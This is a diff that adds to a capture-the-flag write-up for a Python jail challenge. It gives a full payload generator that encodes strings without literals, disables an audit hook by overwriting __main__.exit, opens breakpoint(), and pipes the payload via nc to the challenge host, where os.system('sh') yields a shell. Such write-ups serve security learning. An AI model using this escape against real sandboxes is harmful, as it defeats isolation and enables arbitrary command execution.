@@ -229,4 +229,93 @@ def get_num(num: int):
 
 this algorithm gets a number in a very compressed format by using bit shifting and `-~len(tuple())`.
 
+```
+>>> get_num(123)
+'((((((((((-~len(tuple()))<<(len({id})))+len({id}))<<(len({id})))+len({id}))<<(len({id})))+len({id}))<<(len({id})+len({id})))+len({id}))<<(len({id})))+len({id})'
+```
 
+above is an example of usage of it
+
+so we have access to getattr and setattr functions, but how can we get access to the outside when there is an audit hook thingy?
+
+well, we can overwrite the functionality of `hook` function by removing its access to stop the program with `exit`. to do that, we can write `exit` function in a smaller scope than builtins so that it is prioritized.
+
+also for some reason we can do something like `__builtins__.__import__("builtins")` without triggering the audit hook. this allows us to get the prohibited functions
+
+so, the final idea is that we need to get access to the scope of `__main__`. we can do that using sys.modules.
+
+main ideas:
+```py
+# first
+__builtins__.get("__import__")("sys").modules.get("__main__").exit = __builtins__.get("__import__")("builtins").set
+# second
+__builtins__.get("__import__")("builtins").breakpoint()
+```
+
+```py
+from math import log2
+one = "len({id})"
+
+
+def get_num(num: int):
+    raw_steps = []  # "shift" or "add"
+    big = int(log2(num))
+    for i in range(big, -1, -1):
+        raw_steps.append("shift")
+        if num & (1 << i):
+            raw_steps.append("add")
+    raw_steps = raw_steps[1:]
+    steps = []
+    shift_amt = 0
+    for step in raw_steps:
+        if step == "add":
+            if shift_amt:
+                steps.append(("shift", shift_amt))
+                shift_amt = 0
+            steps.append(("add", 1))
+        else:
+            shift_amt += 1
+    if shift_amt:
+        steps.append(("shift", shift_amt))
+    steps = steps[1:]
+    cmd = "-~len(tuple())"
+    # print(steps)
+    for name, amount in steps:
+        if name == "shift":
+            cmd = f"({cmd})<<({'+'.join([one]*amount)})"
+        else:
+            cmd = f"({cmd})+{one}"
+    return cmd
+
+
+def get_str(text: str):
+    total = []
+    for char in text:
+        total.append("chr(len(__builtins__)-(" + get_num(136 - ord(char)) + "))")
+    return "+".join(total)
+
+# subclasses = f'getattr(getattr(getattr(tuple(), {get_str("__class__")}), {get_str("__base__")}), {get_str("__subclasses__")})()'
+# payload = f'print(getattr({subclasses},{get_str("__getitem__")})({get_num(137)}))'
+
+sys_modules = f'getattr(getattr(__builtins__, {get_str("get")})({get_str("__import__")})({get_str("sys")}),{get_str("modules")})'
+main_module = f'getattr({sys_modules}, {get_str("get")})({get_str("__main__")})'
+useless_func = f'getattr(getattr(__builtins__, {get_str("get")})({get_str("__import__")})({get_str("builtins")}),{get_str("set")})'
+payload = f'setattr({main_module}, {get_str("exit")}, {useless_func});'
+payload += f'getattr(getattr(__builtins__, {get_str("get")})({get_str("__import__")})({get_str("builtins")}),{get_str("breakpoint")})()'
+
+payload += "\n"
+print(payload)
+print("="*30)
+with open("out.txt", 'w') as f:
+    f.write(payload)
+```
+
+above is my final script
+
+then, running the command `python3 gen.py && { cat out.txt; cat; } | nc chal.nbctf.com 3038`, we get a bunch of gibberish outputted from the audit logs. but we also get a shell!
+
+```
+(Pdb) __import__('os').system("sh")
+$ cat flag.txt
+nbctf{1_had_s0me1_t3ll_m3_<REDACTED>}
+```
